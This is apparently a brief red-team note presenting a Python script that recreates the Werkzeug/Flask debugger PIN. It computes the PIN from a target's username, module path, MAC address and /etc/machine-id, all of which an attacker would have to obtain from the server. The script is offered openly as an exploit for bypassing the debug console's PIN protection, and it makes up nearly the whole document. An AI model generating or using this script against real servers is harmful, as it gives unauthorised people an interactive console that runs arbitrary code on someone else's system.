#Red-Team #encoding #Exploit #Generation #Payload #python #Vulnerability #script #Bypass 

## What is BypassWerkzeug?

#### Werkzeug's pincode is generated using a combination of several factors, making it unique for each Flask app. Here's a simple breakdown script on python3 of how it works:

````         
import hashlib
from itertools import chain
probably_public_bits = [
        'aas',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),
]

private_bits = [
        '345049937251',# str(uuid.getnode()),  /sys/class/net/ens33/address
        '258f132cd7e647caaf5510e3aca997c1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print(rv)
````

### Resource: `https://www.daehee.com/werkzeug-console-pin-exploit/`
